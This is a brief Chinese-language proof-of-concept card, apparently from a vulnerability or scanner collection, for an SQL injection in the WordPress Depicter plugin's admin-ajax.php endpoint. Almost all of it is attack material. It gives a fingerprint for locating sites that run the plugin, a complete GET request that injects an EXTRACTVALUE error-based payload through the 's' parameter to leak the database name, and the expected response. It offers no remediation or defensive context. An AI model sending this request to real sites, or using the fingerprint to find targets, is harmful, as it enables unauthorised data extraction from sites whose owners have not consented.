# WordPress_depicter-admin-ajax.php存在SQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`body="wp-content/plugins/depicter"`
- **请求**：`GET /wp-admin/admin-ajax.php?s=test%'%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))='&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index HTTP`
- **响应特征**：200